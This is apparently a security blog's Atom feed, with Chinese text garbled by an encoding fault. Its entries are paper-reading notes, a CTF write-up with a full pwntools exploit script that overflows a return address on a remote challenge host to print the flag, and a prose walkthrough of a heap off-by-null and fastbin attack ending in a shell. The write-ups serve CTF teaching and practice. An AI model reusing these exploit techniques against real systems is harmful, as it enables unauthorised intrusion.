<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>æ˜Ÿåšâ€˜s</title>
  <subtitle>PHDçš„è‡ªæˆ‘ä¿®å…»</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://windcarp.github.io/"/>
  <updated>2017-10-19T12:00:52.000Z</updated>
  <id>https://windcarp.github.io/</id>
  
  <author>
    <name>cxm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>è®ºæ–‡é˜…è¯»åˆ†äº«</title>
    <link href="https://windcarp.github.io/2017/09/27/Academic_share/"/>
    <id>https://windcarp.github.io/2017/09/27/Academic_share/</id>
    <published>2017-09-27T13:53:34.000Z</published>
    <updated>2017-10-19T12:00:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ç¯‡åšå®¢ä¼šå®šæœŸåˆ†äº«æˆ‘é˜…è¯»è®ºæ–‡çš„ç¬”è®°ã€‚</p>
<p>æˆ‘è¯»è®ºæ–‡ä¸€èˆ¬æ˜¯å†™ç¬”è®°æˆ–è€…åšpptï¼Œæ‰€ä»¥ä¼šå®šæœŸç²˜è´´æˆ‘çš„google shareé“¾æ¥åˆ°è¿™ä¸€ç¯‡ã€‚</p>
<h2 id="1-Address-Oblivious-Code-Reuse-On-the-Effectiveness-of-Leakage-Resilient-Diversity-NDSS17"><a href="#1-Address-Oblivious-Code-Reuse-On-the-Effectiveness-of-Leakage-Resilient-Diversity-NDSS17" class="headerlink" title="1. Address-Oblivious Code Reuse: On the Effectiveness of Leakage-Resilient Diversity(NDSS17)"></a>1. <strong>Address-Oblivious Code Reuse: On the Effectiveness of Leakage-Resilient Diversity(NDSS17)</strong></h2><p>è¿™ç¯‡æ–‡ç« æ¥è‡ªäºMITçš„Lincolnå®éªŒå®¤ï¼Œå‘è¡¨åœ¨ä»Šå¹´çš„NDSS17ä¸Šã€‚è¿™ç¯‡æ–‡ç« è®²è¿°çš„æ˜¯é’ˆå¯¹é˜²å¾¡Code Reuseæ–¹å¼çš„æ”»å‡»ï¼Œä¸»è¦é’ˆå¯¹Execute Onlyï¼Œæå‡ºäº†ä¸€ç§æ–°çš„åˆ©ç”¨æ–¹æ³•AOCR(Address Oblivious Code Reuse)ï¼Œè¿™ç§æ–¹æ³•å¯ä»¥ç»•è¿‡ç»å¤§å¤šæ•°çš„é˜²å¾¡ã€‚</p>
<p>AOCRçš„æ”»å‡»ç®€å•æ¦‚æ‹¬åˆ†ä¸¤æ­¥ï¼š</p>
<ol>
<li>æ‰¾åˆ°Indirect code pointerå’Œå‡½æ•°çš„å¯¹åº”å…³ç³»</li>
<li>é€šè¿‡Malicious Loop Redirectionå°†æ‰¾åˆ°çš„Code pointerè¿›è¡ŒChainingå¹¶è°ƒç”¨ï¼Œå®Œæˆæ“ä½œ</li>
</ol>
<p>è¿™ç¯‡æ–‡ç« æœ€åç»™å‡ºäº†Nginxå’ŒApacheçš„å®é™…æ¼æ´çš„åˆ©ç”¨ï¼ˆæœªæ”¾å‡ºä»£ç ï¼‰ï¼Œå¹¶ç»•è¿‡äº†ç»å¤§å¤šæ•°çš„é˜²å¾¡æªæ–½ã€‚</p>
<p>Paper linkï¼š<a href="https://www.ics.uci.edu/~perl/ndss17_aocr.pdf" target="_blank" rel="external">https://www.ics.uci.edu/~perl/ndss17_aocr.pdf</a></p>
<p>Google slide share linkï¼š<a href="https://docs.google.com/presentation/d/1fQOzVHJlcpfsPokgQwLm45qBis1P4qX532JWbi89bgA/edit?usp=sharing" target="_blank" rel="external">https://docs.google.com/presentation/d/1fQOzVHJlcpfsPokgQwLm45qBis1P4qX532JWbi89bgA/edit?usp=sharing</a></p>
<h2 id="2-Cyber-Grand-Shellphish-Phrank"><a href="#2-Cyber-Grand-Shellphish-Phrank" class="headerlink" title="2. Cyber Grand Shellphish(Phrank)"></a>2. <strong>Cyber Grand Shellphish(Phrank)</strong></h2><p>æœ¬ç¯‡å™è¿°äº†Shellphishåœ¨Cyber Grand Challengeä¸­åšçš„ä¸€äº›å·¥ä½œï¼ŒåŸæ–‡é¦–å‘äºphrank (<a href="http://phrack.org/papers/cyber_grand_shellphish.html)ã€‚" target="_blank" rel="external">http://phrack.org/papers/cyber_grand_shellphish.html)ã€‚</a></p>
<p>ä¸ºäº†æ–¹ä¾¿é˜…è¯»ï¼Œæ•…å¯¹å…¶è¿›è¡Œäº†é‡æ’ç‰ˆï¼Œå¹¶æ·»åŠ äº†ä¸€äº›é˜…è¯»ç¬”è®°åœ¨Google docé‡Œé¢ã€‚</p>
<p>Google doc share link: <a href="https://docs.google.com/document/d/1D5TC2j8gWF6H6kO_me1Qo4Qo3EdR03Rvt7mfFcReR8Q/edit?usp=sharing" target="_blank" rel="external">https://docs.google.com/document/d/1D5TC2j8gWF6H6kO_me1Qo4Qo3EdR03Rvt7mfFcReR8Q/edit?usp=sharing</a></p>
<h2 id="3-SemFuzz-Semantics-based-Automatic-Generation-of-Proof-of-Concept-Exploits"><a href="#3-SemFuzz-Semantics-based-Automatic-Generation-of-Proof-of-Concept-Exploits" class="headerlink" title="3. SemFuzz: Semantics-based Automatic Generation of Proof-of-Concept Exploits"></a>3. <strong>SemFuzz: Semantics-based Automatic Generation of Proof-of-Concept Exploits</strong></h2><p>æœ¬ç¯‡å‘è¡¨åœ¨æœ€æ–°çš„CCS 2017ä¸Šï¼Œå…¶å·¥ä½œä¸»è¦æ˜¯ï¼ŒåŸºäºlinux kernelï¼Œé‡‡é›†CVEå’Œgit logä¸­éšå«çš„æ¼æ´ä¿¡æ¯ï¼Œé€šè¿‡è‡ªç„¶è¯­è¨€å¤„ç†è¿›è¡Œåˆ†æï¼Œå¹¶ä½¿ç”¨Fuzzçš„æ‰‹æ®µï¼ˆç²—ç²’åº¦å’Œç»†ç²’åº¦ï¼‰ï¼Œäº§ç”Ÿèƒ½è¿è¡Œåˆ°æ¼æ´å‡½æ•°çš„POC exploitã€‚</p>
<p>æœ€ç»ˆçš„æ•ˆæœæ˜¯åœ¨æ»¡è¶³æ¡ä»¶çš„122ä¸ªCVEé‡ŒæˆåŠŸäº§ç”Ÿäº†18ä¸ªPocï¼Œå¹¶é¡ºä¾¿å‘ç°äº†ä¸€ä¸ª0dayå’Œä¸€ä¸ªUndisclosedæ¼æ´ã€‚</p>
<p>æœ¬ç¯‡çš„ä½œè€…æ¥è‡ªä¿¡å·¥æ‰€ã€Indianaä¸äººæ°‘å¤§å­¦ï¼Œä¸€ä½œæ˜¯Wei Youã€‚</p>
<p>Google doc share link: <a href="https://docs.google.com/presentation/d/1v223Vvh8rmf6Fk5mjVb5uaJ7FnTYYi0XFs9-iypjP3k/edit?usp=sharing" target="_blank" rel="external">https://docs.google.com/presentation/d/1v223Vvh8rmf6Fk5mjVb5uaJ7FnTYYi0XFs9-iypjP3k/edit?usp=sharing</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è¿™ç¯‡åšå®¢ä¼šå®šæœŸåˆ†äº«æˆ‘é˜…è¯»è®ºæ–‡çš„ç¬”è®°ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘è¯»è®ºæ–‡ä¸€èˆ¬æ˜¯å†™ç¬”è®°æˆ–è€…åšpptï¼Œæ‰€ä»¥ä¼šå®šæœŸç²˜è´´æˆ‘çš„google shareé“¾æ¥åˆ°è¿™ä¸€ç¯‡ã€‚&lt;/p&gt;
&lt;h2 id=&quot;1-Address-Oblivious-Code-Reuse-On-the-Effectiveness-o
    
    </summary>
    
      <category term="Academic" scheme="https://windcarp.github.io/categories/Academic/"/>
    
    
      <category term="Paper" scheme="https://windcarp.github.io/tags/Paper/"/>
    
  </entry>
  
  <entry>
    <title>Pwnhub çº¿ä¸‹æ²™é¾™CTFä¹‹cLEMENCyé¢˜è§£</title>
    <link href="https://windcarp.github.io/2017/08/14/Writeup/"/>
    <id>https://windcarp.github.io/2017/08/14/Writeup/</id>
    <published>2017-08-14T07:27:12.000Z</published>
    <updated>2017-08-14T10:23:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>8æœˆ12æ—¥Pwnhubç¬¬ä¸€æ¬¡æ²™é¾™ï¼Œå¿ƒæƒ³åˆ°è¦å’Œä¸€ä¼—å¤§ä½¬é¢åŸºï¼Œå¿ƒæƒ…å¼‚å¸¸æ¿€åŠ¨ï¼Œäºæ˜¯æ”¥ç€è®¨æ¥çš„é‚€è¯·å‡½ï¼Œå†’ç€12çº§å¤§é›¨ï¼Œæ»¡å¿ƒæ¬¢å–œçš„èµ¶åˆ°äº†äº”ç¯çš„å°åˆ«å¢…~</p>
<p>ä¸Šåˆçš„è®®é¢˜å¹²è´§æ»¡æ»¡ï¼Œæœ‰å† åŸå¤§ä½¬ï¼Œ360å°å§å§å’Œé’åšå­¦å¼Ÿflyyyçš„åˆ†äº«ï¼Œä¸­åˆçš„<strong>çƒ§çƒ¤ + å¾·å·æ‰‘å…‹</strong>ä¹‹åä¾¿æ˜¯Pwnhubçš„ç»å…¸é¡¹ç›®CTFï¼Œå…¶ä¸­Explorerå¤§ä½¬å‡ºäº†ä¸€é“<code>cLEMENCy</code>æ¶æ„çš„é¢˜ç›®ã€‚</p>
<p>æåˆ°<code>cLEMENCy</code>å°±ä¸å¾—ä¸æåˆ°åˆšè¿‡å»çš„<code>Defcon 25 Final</code>ã€‚ä¸å»å¹´çš„CGCä¸åŒï¼Œ<code>Defcon Final</code>ä»Šå¹´çš„è§„åˆ™æ˜¯ï¼Œä¸»åŠæ–¹ä¸æ¯”èµ›å‰ä¸€å¤©24å°æ—¶æ”¾å‡ºè‡ªå®šä¹‰æ¶æ„ï¼Œä»¥åŠç›¸åº”çš„<code>emulator</code>ï¼Œç•™ç»™å‚èµ›è€…24å°æ—¶çš„å‡†å¤‡æ—¶é—´ã€‚è¿™æ ·ä¸€æ¥ï¼Œæ‰€æœ‰çš„å‚èµ›é˜Ÿéƒ½ç«™åœ¨äº†åŒä¸€èµ·è·‘çº¿ä¸Šï¼Œéœ€è¦ä»0å‡†å¤‡æ‰€æœ‰çš„å·¥å…·ã€‚</p>
<h2 id="0x01-ç®€ä»‹ï¼š9bitçš„å¥‡æ€ªæ¶æ„"><a href="#0x01-ç®€ä»‹ï¼š9bitçš„å¥‡æ€ªæ¶æ„" class="headerlink" title="0x01 ç®€ä»‹ï¼š9bitçš„å¥‡æ€ªæ¶æ„"></a>0x01 ç®€ä»‹ï¼š9bitçš„å¥‡æ€ªæ¶æ„</h2><p><code>cLEMENCyï¼ˆthe LEgitbs Middle ENdian Computer architectureï¼‰</code>ç”±LBSçš„lightingç­‰å¤§ä½¬ä»¬è®¾è®¡ã€‚<code>cLEMENCy</code>çš„æŒ‡ä»¤æ‰‹å†Œä¸­ç»™å‡ºäº†æ¶æ„çš„æ‰€æœ‰ç»†èŠ‚ã€‚ç®€å•çš„æ€»ç»“å¦‚ä¸‹ï¼š</p>
<ol>
<li><p>æ¯å­—èŠ‚ç”±9bitç»„æˆï¼›ä½¿ç”¨æ··åˆåºå­˜å‚¨ï¼ŒRegister XXYYZZ â†’ Memory YYXXZZï¼ŒRegister XXYY â†’ Memory YYXX</p>
<blockquote>
<p>â€œEach byte is 9 bits of data, bit 0 is the left most significant bit. Middle-Endian data stores bits 9 to 17, followed by bits 0 to 8, then bits 18 to 27 in memory when handling three bytes. Two bytes of data will have bits 9-17 then bits 0 to 8 written to memory.â€</p>
</blockquote>
</li>
<li><p>å†…å­˜å¸ƒå±€ï¼šå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚æ¼æ´åˆ©ç”¨çš„ç›®æ ‡å³æŠŠFlagé¡µé¢å¼€å§‹çš„ä¸€æ®µå†…å­˜ï¼Œå³flagæ‰“å°å‡ºæ¥ã€‚æ‰€ä»¥è¯´åªéœ€è¦ä»»æ„åœ°å€è¯»å°±å¯ä»¥äº†ã€‚</p>
<p> <img src="https://ws3.sinaimg.cn/large/006tNc79gy1fija68reuoj310y0hkn1b.jpg" alt=""></p>
</li>
<li><p>æŒ‡ä»¤é›†ï¼šcLEMENCyæ˜¯RISCï¼Œä¸è¿‡æœ€é•¿54bitï¼ŒæŒ‡ä»¤é›†å’Œarmæœ‰ç‚¹ç±»ä¼¼ï¼›</p>
</li>
<li><p>å¯„å­˜å™¨ï¼šå…±31ä¸ªå¯„å­˜å™¨ï¼Œ<code>R0</code>ä¸€èˆ¬ç”¨äº<code>param 1</code>å’Œ<code>ret value</code>ï¼Œ<code>ST</code>è¡¨ç¤ºæ ˆï¼Œ<code>RA</code>è¡¨ç¤ºè¿”å›åœ°å€ã€‚</p>
</li>
<li><p>æ ˆè°ƒç”¨ï¼šæ ˆæœ‰ä¸¤ä¸ªå¢é•¿æ–¹å‘ï¼›å¯¹æ ˆçš„æ“ä½œå¾€å¾€é€šè¿‡<code>STT(Store Tri)</code>æŒ‡ä»¤å®ç°ã€‚<code>STTm</code>æŒ‡ä»¤æœ‰ä¸‰ç§ï¼Œå…¶ä¸­0ï¼Œ1ï¼Œ2åˆ†åˆ«è¡¨ç¤ºå†…å®¹å­˜å…¥memoryä¹‹å<code>rB</code>æ“ä½œæ•°æ˜¯å¢åŠ è¿˜æ˜¯å‡å°‘ï¼Œä»è€Œè¡¨ç¤ºæ ˆçš„å¢é•¿æ–¹å‘ã€‚</p>
</li>
</ol>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œæ¯”èµ›ä¸­ä½¿ç”¨çš„bianryä½¿ç”¨äº†<code>neatlibc</code>ï¼Œä½†ä¸ºäº†æ–¹ä¾¿æ¨¡æ‹Ÿå™¨å¯¹ioå’Œå†…å­˜ç®¡ç†è¿›è¡Œäº†ä¸€äº›ä¿®æ”¹ã€‚</p>
<h2 id="0x02-æ¼æ´åˆ©ç”¨ï¼šRet2Put"><a href="#0x02-æ¼æ´åˆ©ç”¨ï¼šRet2Put" class="headerlink" title="0x02 æ¼æ´åˆ©ç”¨ï¼šRet2Put"></a>0x02 æ¼æ´åˆ©ç”¨ï¼šRet2Put</h2><p>æ—¢ç„¶æ˜¯2ä¸ªå°æ—¶çš„CTFï¼Œå¤§ä½¬ä»¬å‡ºé¢˜è‚¯å®šæ˜¯æ”¾è¶³äº†æ°´233ã€‚ç”¨IDAå¤§æ¦‚åˆ†æä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°è¿™æ˜¯ä¸€ä¸ªç®€å•çš„ä¼ª<code>&quot;Base64&quot;</code>ã€‚</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fijbgetydzj312w0ocdoa.jpg" alt=""></p>
<blockquote>
<p>è¿™é‡Œç”¨çš„æ˜¯<code>Tea Deliverers</code>åœ¨æ¯”èµ›æ—¶ä½¿ç”¨çš„<code>IDA Processor</code>ï¼ˆè†œLYMå’ŒExplorerå’ŒGYCç­‰å¤§ä½¬ï¼‰ã€‚PPPåœ¨èµ›åä¹Ÿæ”¾å‡ºäº†ä»–ä»¬æ¯”èµ›æ—¶ä½¿ç”¨çš„<a href="https://github.com/pwning/defcon25-public" target="_blank" rel="external">Utils</a>ã€‚</p>
</blockquote>
<p>å…¶ä¸­ä¸»è¦çš„å‡½æ•°<code>read_string</code>:è¾“å…¥ä¸€ä¸ª9bitè¡¨ç¤ºçš„å­—ç¬¦ä¸²ï¼ˆäº¤äº’ä¹Ÿå…¨éƒ¨éƒ½æ˜¯åŸºäº9bitï¼‰ï¼Œä¹‹åä¼šä»¥ä¸‰å­—èŠ‚ä¸ºå•ä½ï¼Œè½¬æˆä»¥ä¸‰å­—èŠ‚ä¸ºå•ä½çš„å€¼ã€‚å¦‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;AAA\n&apos; -&gt; 0010101</div></pre></td></tr></table></figure></p>
<p>åœ¨è°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶ï¼Œä¼ å…¥çš„lenè¿‡é•¿ï¼Œäºæ˜¯å¯ä»¥æº¢å‡ºä¸Šä¸€ä¸ªå‡½æ•°çš„è¿”å›åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥<code>Ret2put</code>ï¼Œå³ä¿®æ”¹è¿”å›åœ°å€å’Œå‚æ•°ä¸º<code>Put</code>å‡½æ•°å’Œ<code>flag page</code>çš„åœ°å€ï¼Œå³å¯æ‰“å°å‡ºflagã€‚</p>
<p>è§‚å¯Ÿmain_funcè¿”å›å¤„ï¼Œ<code>LDT R28-RA, [R28 + 0]</code>å°†R28, ST, RAä¸‰ä¸ªå¯„å­˜å™¨èµ‹å€¼ï¼Œæ˜¯å¯æ§çš„ï¼Œè€Œputsçš„å‚æ•°R0ä¹Ÿé€šè¿‡<code>ad. R0, R28, R27</code>æ§åˆ¶ã€‚</p>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fijbr5ncb1j30kx0euq7p.jpg" alt=""></p>
<p>äºæ˜¯æ„é€ å¯¹åº”å€¼å³å¯ã€‚</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fijc2pzv9uj30iq068gnz.jpg" alt=""></p>
<p>è¿˜æœ‰ä¸€ç‚¹æ˜¯ï¼ŒSTè¦å¡«ä¸Šä¸€ä¸ªåˆæ³•å€¼ï¼Œå¦åˆ™<code>puts</code>æ—¶ä¼š<code>crash</code>ã€‚ä½†æ˜¯ç¨‹åºæ˜¯æ²¡æœ‰éšæœºåŒ–çš„ï¼Œæ‰€ä»¥æ¯æ¬¡è¿è¡Œéƒ½ä¸€æ ·ã€‚è¿™ä¹Ÿå¯¼è‡´äº†æ¯”èµ›æ—¶â€æŠ„ä½œä¸š(ç›´æ¥é‡æ”¾)â€å¼‚å¸¸æ–¹ä¾¿233</p>
<p>æœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">import string</div><div class="line"></div><div class="line">def p27(bit24):</div><div class="line">    r = bin(bit24)[2:].rjust(27, &apos;0&apos;)</div><div class="line">    r = r[9:18] + r[0:9] + r[18:27]</div><div class="line">    return r</div><div class="line"></div><div class="line"></div><div class="line">def sb8tosb9(payload):</div><div class="line">    stream = &apos;&apos;.join(bin(ord(x))[2:].rjust(9, &apos;0&apos;) for x in payload)</div><div class="line">    pad = len(stream) % 8</div><div class="line">    if pad != 0:</div><div class="line">        length = len(stream) + (8 - pad)</div><div class="line">    else:</div><div class="line">        length = len(stream)</div><div class="line">    stream = stream.ljust(length, &apos;0&apos;)</div><div class="line">    payload9 = &apos;&apos;.join(</div><div class="line">        chr(int(stream[i:i + 8], 2)) for i in range(0, len(stream), 8))</div><div class="line">    return payload9</div><div class="line"></div><div class="line">def sb9tosb8(payload):</div><div class="line">    stream = &apos;&apos;.join(bin(ord(x))[2:].rjust(8, &apos;0&apos;) for x in payload)</div><div class="line">    length = (len(stream) / 9) * 9</div><div class="line">    stream = stream[:length]</div><div class="line">    return &apos;&apos;.join(</div><div class="line">        chr(int(stream[i:i + 9], 2)) for i in range(0, len(stream), 9))</div><div class="line"></div><div class="line">alphabet = &apos;&apos;</div><div class="line">for i in range(26):</div><div class="line">    alphabet += (chr(i + ord(&apos;A&apos;)))</div><div class="line">for i in range(26):</div><div class="line">    alphabet += (chr(i + ord(&apos;a&apos;)))</div><div class="line">for i in range(10):</div><div class="line">    alphabet += (chr(i + ord(&apos;0&apos;)))</div><div class="line">alphabet += &apos;+/&apos;</div><div class="line">def conventer(bit18):</div><div class="line">    res = &apos;&apos;</div><div class="line">    res += alphabet[int(&quot;0b&quot; + bit18[:6],2)]</div><div class="line">    res += alphabet[int(&quot;0b&quot; + bit18[6:12],2)]</div><div class="line">    res += alphabet[int(&quot;0b&quot; + bit18[-6:],2)]</div><div class="line">    return res</div><div class="line"></div><div class="line"></div><div class="line">p = remote(&quot;54.223.103.62&quot;,10000)</div><div class="line">flag_addr = 0x4010000 + 0x21</div><div class="line">pc_addr = 0x645F</div><div class="line">newpld = 11 * p27(0x414141) + p27(flag_addr) + p27(0x3fffbc7) + p27(pc_addr)</div><div class="line">payload = &apos;&apos;</div><div class="line">for i in range(len(newpld) / 18):</div><div class="line">    payload += conventer(newpld[i*18:(i+1)*18])</div><div class="line">p.send(sb8tosb9(payload + &apos;\n&apos;))</div><div class="line">p.recvn(0x2d)</div><div class="line">data = sb9tosb8(p.recvall(timeout = 1))</div><div class="line">print data</div></pre></td></tr></table></figure>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fijbzy7fl3j30c7014t91.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;8æœˆ12æ—¥Pwnhubç¬¬ä¸€æ¬¡æ²™é¾™ï¼Œå¿ƒæƒ³åˆ°è¦å’Œä¸€ä¼—å¤§ä½¬é¢åŸºï¼Œå¿ƒæƒ…å¼‚å¸¸æ¿€åŠ¨ï¼Œäºæ˜¯æ”¥ç€è®¨æ¥çš„é‚€è¯·å‡½ï¼Œå†’ç€12çº§å¤§é›¨ï¼Œæ»¡å¿ƒæ¬¢å–œçš„èµ¶åˆ°äº†äº”ç¯çš„å°åˆ«å¢…~&lt;/p&gt;
&lt;p&gt;ä¸Šåˆçš„è®®é¢˜å¹²è´§æ»¡æ»¡ï¼Œæœ‰å† åŸå¤§ä½¬ï¼Œ360å°å§å§å’Œé’åšå­¦å¼Ÿflyyyçš„åˆ†äº«ï¼Œä¸­åˆçš„&lt;strong&gt;çƒ§çƒ¤ + å¾·å·æ‰‘å…‹&lt;/s
    
    </summary>
    
      <category term="CTF-Pwn" scheme="https://windcarp.github.io/categories/CTF-Pwn/"/>
    
    
      <category term="Pwn" scheme="https://windcarp.github.io/tags/Pwn/"/>
    
      <category term="CTF" scheme="https://windcarp.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Pwn500ï¼šshrink the chunk(LCTF 2016)</title>
    <link href="https://windcarp.github.io/2016/12/27/Test-Blog/"/>
    <id>https://windcarp.github.io/2016/12/27/Test-Blog/</id>
    <published>2016-12-27T07:27:12.000Z</published>
    <updated>2017-10-07T07:29:44.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>è¿™æ˜¯ä¸€ç¯‡æµ‹è¯•åšå®¢ã€‚</p>
</blockquote>
<p>XDCTFæ˜¯å›½å†…æ¯”è¾ƒç»å…¸çš„ä¸€ä¸ªCTFäº†ï¼Œä»Šå¹´æ”¹æˆLCTFï¼Œä¸­é—´å‘ç”Ÿçš„ä¸€äº›å‰§æƒ…ä¹Ÿæ˜¯ä»¤äººå”å˜˜å•Šâ€¦</p>
<p>é‚£é¦–å…ˆæ¥çœ‹è¿™ä¸ªé¢˜ç›®å§ï¼Œè¿™é¢˜ç»¼åˆè€ƒå¯Ÿäº†heapå†…å­˜ç®¡ç†ï¼Œshrink the trunkï¼Œfastbin corruptionï¼Œ magic allocå’Œonegadgetï¼Œè¿˜æ˜¯æ¯”è¾ƒå¤æ‚çš„ã€‚</p>
<hr>
<h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>é¦–å…ˆï¼Œé¢˜ç›®çš„ç»“æ„å¤§æ¦‚å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sender</div><div class="line">    recver</div><div class="line">        package package package</div></pre></td></tr></table></figure></p>
<p>ä¸€ä¸ªbssæ€»æŒ‡é’ˆå¸¦å‡ºæ¥ä¸‰æ¡çº¿è´Ÿè´£ç®¡ç†ã€‚<br>é¦–å…ˆè¦æœ‰ä¸€ä¸ªsenderï¼Œç„¶åç”¨senderå¯ä»¥å»æ–°å»ºrecverï¼Œæ–°å»ºå®Œä¹‹åï¼Œå¯ä»¥æ–°å»ºpackageæŒ‚åœ¨senderä¸Šé¢ï¼Œæ¯ä¸ªç»“æ„éƒ½æ˜¯é€šè¿‡é“¾è¡¨æ¥è¡¨ç¤ºï¼Œ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">00000000 package_node    struc ; (sizeof=0x20, mappedto_3)</div><div class="line">00000000 next            dq ?                    ; offset</div><div class="line">00000008 prev            dq ?                    ; offset</div><div class="line">00000010 size            dq ?</div><div class="line">00000018 contant         dq ?</div></pre></td></tr></table></figure></p>
<p>ä½†æ€»ç»“æ¥çœ‹ï¼Œå°±æ˜¯æä¾›äº†ä¸€ä¸ªmallocä¸free çš„æ¥å£ï¼Œmallocçš„å¤§å°å°äº0x208ï¼Œç„¶åshowæ˜¯ç”¨%sè¾“å‡ºã€‚</p>
<h2 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h2><p>è¾“å…¥å‡½æ•°çš„off-by-nullã€‚è¿™ä¸ªå‡½æ•°ç¬¬ä¸€æ¬¡çœ‹ç«Ÿç„¶æ”¾è¿‡å»äº†ã€‚</p>
<h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>æ ¹æ®å‰é¢åˆ†æçš„æ¡ä»¶ï¼Œåˆ©ç”¨å¯ä»¥é€šè¿‡shrink the trunkè¿›è¡Œã€‚</p>
<p>å…¶ä¸­è¦æ³¨æ„çš„æ˜¯å¤§å°ï¼ŒåŸç†æ˜¯é€šè¿‡ä¿®æ”¹free small trunkçš„sizeå­—æ®µï¼Œä½¿å†åˆ†é…æ—¶å¯¹ä¸‹ä¸€å—prev sizeå’Œprez inuseçš„ä¿®æ”¹æ— æ•ˆã€‚é‚£å¦‚æœå†å¯¹ä¸‹ä¸€å—è¿›è¡Œé‡Šæ”¾ï¼Œä»ç„¶ä¼šé€šè¿‡prev size prev inuseè¿›è¡Œåˆå¹¶æ“ä½œï¼Œä»è€Œé€ æˆä¸­é—´å†åˆ†é…çš„chunkè¢«å¤§å—åŒ…å«åœ¨å†…ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œå¯ä»¥é€šè¿‡fastbin fd attackè¿›è¡Œï¼Œå‰ææ˜¯leakã€‚<br>æˆ‘ä»¬é€šè¿‡ä¿®æ”¹é“¾è¡¨æŒ‡é’ˆè¾¾åˆ°leak libcçš„æ•ˆæœã€‚æ¥ä¸‹æ¥é‡æ¥ä¸€éï¼Œè¿›è¡Œfd attackã€‚</p>
<p>è¿™ä¸ªfd attackè¦ç»•è¿‡æ£€æŸ¥ï¼Œåªèƒ½ä½¿ç”¨ä¸Šä¸€ä¸ªå­—æ˜¯0x0000çš„0x7fxxxxçš„åœ°å€è¿›è¡Œã€‚å‡è®¾0x7fffåœ°å€æ˜¯addrï¼Œåˆ™æˆ‘ä»¬éœ€è¦è¾“å…¥addr-0x3-0x8æ‰èƒ½è¾¾åˆ°ä½¿ç”¨æ•ˆæœã€‚</p>
<p>é‚£ä¹ˆé—®é¢˜åˆæ¥äº†ï¼Œå› ä¸ºè¿™é‡Œé¢˜ç›®ä¼šåœ¨æ–°åˆ†é…çš„å—å†™ä¸Š0x18çš„ä¸œè¥¿ï¼Œç›¸å½“äºåé¢çš„0x18ä¹‹åæ‰èƒ½è¦†ç›–ï¼Œå¯»æ‰¾malloc_hook, free_hook, got_tableå‡ä¸è¡Œã€‚</p>
<p>éšä¾¿åœ¨é™„è¿‘çœ‹çœ‹ï¼Œå‘ç°å…¶å®malloc_hook hijackåé¢æ­£å¥½æœ‰top_chunkçš„ä½ç½®ï¼Œè€Œä¸”å¥½é™©å¯ä»¥å†™ä½5ä¸ªå­—èŠ‚ã€‚</p>
<p>è¿›è¡Œå°è¯•ï¼Œå‘ç°main_arenaå‰é¢flagsï¼Œè™½ç„¶è¦†ç›–äº†ä½†æ˜¯å½±å“ä¸å¤§ï¼Œæˆ‘ä»¬æ§åˆ¶top_chunkåˆ°got_tableçš„ä½ç½®ï¼ŒæˆåŠŸåˆ†é…äº†gottableä¸Šé¢ã€‚ç„¶åé‡Œé¢çš„å‡½æ•°è¦†ç›–ä¸ºonegadgetï¼Œæ‰æœ€ç»ˆå¼¹å‡ºshellã€‚</p>
